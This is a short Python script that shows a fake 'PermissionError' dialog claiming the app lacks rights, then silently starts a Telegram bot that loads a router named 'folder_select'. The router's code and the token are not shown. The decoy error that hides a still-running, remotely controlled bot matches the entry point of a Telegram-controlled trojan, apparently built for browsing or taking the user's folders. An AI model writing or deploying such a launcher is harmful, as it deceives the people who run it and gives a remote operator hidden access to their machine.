from aiogram import Bot
import asyncio
import logging
import tkinter as tk
from tkinter import messagebox
import folder_select
from settings import dp, bot, TOKEN

direction = ""

root = tk.Tk()
root.withdraw()
messagebox.showerror("PermissionError", "App doesn`t have enough rights to do that")
root.destroy()


async def start_bot():
    tg_bot = Bot(TOKEN)
    await bot.delete_webhook(drop_pending_updates=True)
    dp.include_routers(folder_select.router)
    await dp.start_polling(tg_bot)


async def main():
    # server_task = asyncio.to_thread(start_server)
    bot_task = start_bot()
    await asyncio.gather(bot_task)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
